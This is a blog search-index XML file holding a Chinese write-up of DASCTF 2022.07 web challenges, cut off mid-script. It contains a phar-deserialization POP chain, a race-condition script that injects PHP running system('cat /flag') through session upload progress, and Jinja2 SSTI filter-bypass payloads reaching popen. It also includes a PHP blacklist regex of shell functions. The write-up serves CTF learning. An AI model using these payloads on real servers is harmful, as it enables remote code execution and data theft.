<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DASCTF2022.07赋能赛-Web复现</title>
      <link href="/post/1.html"/>
      <url>/post/1.html</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF2022-07赋能赛-Web"><a href="#DASCTF2022-07赋能赛-Web" class="headerlink" title="DASCTF2022.07赋能赛-Web"></a>DASCTF2022.07赋能赛-Web</h1><h1 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247495952&idx=1&sn=989d3f31b154890ebeea701332b3b893&chksm=fbf46b60cc83e2761c083f40f24f0e41d5e9a1b24e1e9fedd911bec243b6f0dd2883323ccc70&mpshare=1&scene=23&srcid=07266JSqMiz5bR6HIwpDfHDL&sharer_sharetime=1658823612725&sharer_shareid=029344dcf9624c2d719bc3d553ed4aa3#rd">官方wp</a></p><p><a href="https://ek1ng.com/DASCTF2022_7.html">参考链接</a></p><p><a href="https://www.viewofthai.link/2022/08/03/dasctf7%E6%9C%88-%E8%B5%8B%E8%83%BD%E8%B5%9B-wp/">链接</a></p><p><a href="https://www.wolai.com/7MymbpgzhHWMdAoh2Ycb89">链接</a></p><h1 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h1><h2 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h2><p>phar文件包含绕过上传白名单</p><p>file_get_contents触发phar反序列化</p><h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>非预期：</p><p><img src="/img/image-20220910230110-ynlhfca.png" alt="image.png"></p><p>主要是两个功能点，一个上传（png白名单），一个文件读取（存在文件包含漏洞，非预期：直接<code>/flag</code>），file.php的f参数进行了<code>..</code>的过滤，但是<code>./</code>可以进行读取源码。</p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">    <span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">uploadfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>file.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$fsize</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;f = <span class="variable">$_FILES</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">savefile</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">            <span class="variable">$fname</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>; </span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>)) &#123; </span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$fname</span>); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;upload success! :D&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$cont</span> = <span class="variable language_">$this</span>-&gt;fname;</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable language_">$this</span>-&gt;fsize;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$cont</span>-&gt;<span class="variable">$size</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;this_is_upload&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">uploadfile</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_check</span>()) &#123; </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">savefile</span>(); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;what are you uploaded? :0&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">                    <span class="variable">$filter</span> = <span class="string">&#x27;/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i&#x27;</span>;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$filter</span>,<span class="variable">$f</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&#x27;what are you doing!! :C&#x27;</span>;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span> &#123; </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;png onlyyy! XP&#x27;</span>; </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fname</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="variable">$fname</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|php:|gopher|dict|\.\./i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;illegal fname :P&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">                <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">      </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ok</span>(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>)==<span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$door</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$door</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacked!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;illegal fname XD&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;str=<span class="string">&quot;It&#x27;s works&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件都以<code>png</code>为结尾导致即使是进行了<code>%00</code>后缀绕过但是还是无法作为<code>.php</code>文件进行解析，但是在这里知道了文件名命名规则</p><p><img src="/img/image-20220910230736-df2379f.png" alt="image.png"></p><p>同时对文件内容进行了检查</p><p><img src="/img/image-20220910231051-r0pj6nr.png" alt="image.png"></p><p>文件上传无法利用，就转到文件读取这里</p><p><img src="/img/image-20220910231224-bdivhow.png" alt="image.png"></p><p>发现<code>file_get_comtents</code>同时没有过滤掉<code>phar://</code>,可以利用此函数结合phar反序列化，然后寻找可利用点在backdoor方法中看到<code>include</code>函数，构造pop链条：Test类触发Upload类的<code>__toString</code>方法，然后触发Show类的<code>__get</code>方法，接着是<code>__call</code>方法，然后触发backdoor方法的include函数，进行文件包含</p><p>首先构造phar文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;str-&gt;fname = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;1.png&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;str-&gt;fsize = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;poc.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span> . <span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>这里使用gzip来绕过文件上传时对文件内容检测，而文件压缩对phar不会产生影响，将压缩文件进行重命名<code>poc.png</code>,上传之后直接包含即可</p><p><img src="/img/image-20220910235650-xgyxjul.png" alt="image.png"></p><p>这里官方wp是利用了session文件包含（通过phpinfo可以查看是否开启<code>session.upload_progress</code>【默认开启】），利用点还是backdoor方法的include函数，这里贴一下phra脚本和竞争脚本</p><p><img src="/img/image-20220911103941-y1ht023.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fsize</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;str = <span class="variable">$upload</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;fname=<span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$upload</span>-&gt;fsize=<span class="string">&#x27;/tmp/sess_chaaa&#x27;</span>;</span><br><span class="line"><span class="comment">// $test-&gt;str = &#x27;okkkk&#x27;;</span></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,threading,requests,re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">check=<span class="literal">True</span></span><br><span class="line"><span class="comment"># 触发phar文件反序列化去包含session上传进度文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">include</span>(<span class="params">fileurl,s</span>):</span><br><span class="line">    <span class="keyword">global</span> check,flag</span><br><span class="line">    <span class="keyword">while</span> check:</span><br><span class="line">        fname = md5(<span class="string">&#x27;shell.png&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()+<span class="string">&#x27;.png&#x27;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;phar://upload/&#x27;</span>+fname</span><br><span class="line">        &#125;</span><br><span class="line">        res = s.get(url=fileurl, params=params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;working&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag = re.findall(<span class="string">&#x27;upload_progress_working(DASCTF&#123;.+&#125;)&#x27;</span>,res.text)[<span class="number">0</span>]</span><br><span class="line">            check = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用session.upload.progress写入临时文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sess_upload</span>(<span class="params">url,s</span>):</span><br><span class="line">    <span class="keyword">global</span> check</span><br><span class="line">    <span class="keyword">while</span> check:</span><br><span class="line">        data=&#123;</span><br><span class="line">              <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;&lt;?php echo &#x27;working&#x27;,system(&#x27;cat /flag&#x27;);?&gt;\&quot;); ?&gt;&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;chaaa&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        files=&#123;</span><br><span class="line">            <span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;chaaa.png&#x27;</span>, <span class="string">b&#x27;cha&#x27;</span>*<span class="number">300</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        s.post(url=url,data=data,cookies=cookies,files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">ip, port</span>):</span><br><span class="line">    url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/&quot;</span></span><br><span class="line">    fileurl = url+<span class="string">&#x27;file.php&#x27;</span></span><br><span class="line">    uploadurl = url+<span class="string">&#x27;upload.php&#x27;</span></span><br><span class="line">  </span><br><span class="line">    num = threading.active_count()</span><br><span class="line">    <span class="comment"># 上传phar文件</span></span><br><span class="line">    file = &#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;./shell.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">    ret = requests.post(url=uploadurl, files=file)</span><br><span class="line">    <span class="comment"># 文件上传条件竞争获取flag</span></span><br><span class="line">    event=threading.Event()</span><br><span class="line">    s1 = requests.Session()</span><br><span class="line">    s2 = requests.Session()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        threading.Thread(target=sess_upload,args=(uploadurl,s1)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        threading.Thread(target=include,args=(fileurl,s2,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> threading.active_count() != num:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(HOST, PORT)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>这个题除了官方的session文件包含实现rce外，还有没有别的方法，既然有include本地无法包含马儿（马儿上传被限制），那么远程包含可以吗？查看phpinfo信息<code>allow_url_fopen = on</code> 和 <code>allow_url_include = off</code>，前者用于file_get_content，而后者用于<code>include</code>,因此我们没有办法通过控制include函数的参数来包含远程的文件。</p><h1 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h1><h2 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h2><p>Flask SSTI bypass</p><p>SSTI 盲注</p><h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>打开题目是一个输入框，根据题目提示判断存在ssti，存在过滤，拿脚本跑一下，记得设置一下延迟</p><p><img src="/img/image-20220919190707-r4n3199.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;&#125;, &#123;&#123;, ], [,  , +, _, ., x, g, request, <span class="keyword">print</span>, args, values, input, globals, getitem, <span class="class"><span class="keyword">class</span>, <span class="title">mro</span>, <span class="title">base</span>, <span class="title">session</span>, <span class="title">add</span>, <span class="title">chr</span>, <span class="title">ord</span>, <span class="title">redirect</span>, <span class="title">url_for</span>, <span class="title">popen</span>, <span class="title">os</span>, <span class="title">read</span>, <span class="title">flag</span>, <span class="title">config</span>, <span class="title">builtins</span>, <span class="title">get_flashed_messages</span>, <span class="title">get</span>, <span class="title">subclasses</span>, <span class="title">form</span>, <span class="title">cookies</span>, <span class="title">headers</span></span></span><br></pre></td></tr></table></figure><p>这里的话就直接是对症下药了，过滤了<code>&#123;&#123;` `&#125;&#125;</code> ，那这里就要考虑使用<code>&#123;% print(....) %&#125;</code> 和<code>&#123;% if .. %&#125;success&#123;% endif %&#125;</code> 通过fuzz可以发现过滤了print，那么第一种不能使用，第二种的话便不能回显命令执行的结果，这里可以使用外带数据的方式拿到flag，<code>.</code> 可以使用<code>|attr()</code> 绕过，<code>_</code> 可以使用<code>unicode</code> 编码绕过，同时attr也支持unicode编码，<code>[ 和 ]</code> 的话可以使用<code>getitem</code> 配合<code>attr</code> 来进行绕过，接下来就是对payload进行替换</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[遍历].__init__.__globals__[<span class="string">&quot;popen&quot;</span>])%&#125;success&#123;%<span class="keyword">endif</span>%&#125;  </span><br><span class="line"></span><br><span class="line">--&gt;&gt;  </span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__class__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__bases__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__getitem__&quot;</span>)(<span class="number">0</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__subclasses__&quot;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__getitem__&quot;</span>)(遍历)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__init__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__globals__&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;__getitem__&quot;</span>)(<span class="string">&quot;popen&quot;</span>))%&#125;success&#123;%<span class="keyword">endif</span>%&#125;  --&gt;&gt;  </span><br><span class="line"></span><br><span class="line">--&gt;&gt;  </span><br><span class="line"></span><br><span class="line">&#123;%<span class="keyword">if</span>(<span class="string">&quot;&quot;</span>|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="number">0</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(遍历)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|<span class="title function_ invoke__">attr</span>(<span class="string">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="string">&quot;\u0070\u006f\u0070\u0065\u006e&quot;</span>))%&#125;success&#123;%<span class="keyword">endif</span>%&#125;</span><br></pre></td></tr></table></figure><p>找popen的话简单写一个脚本遍历一下即可：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">120</span>,<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://2667426a-a13b-4c20-b7ef-01c0671d1f45.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">    payload = &#123;<span class="string">&quot;nickname&quot;</span>:<span 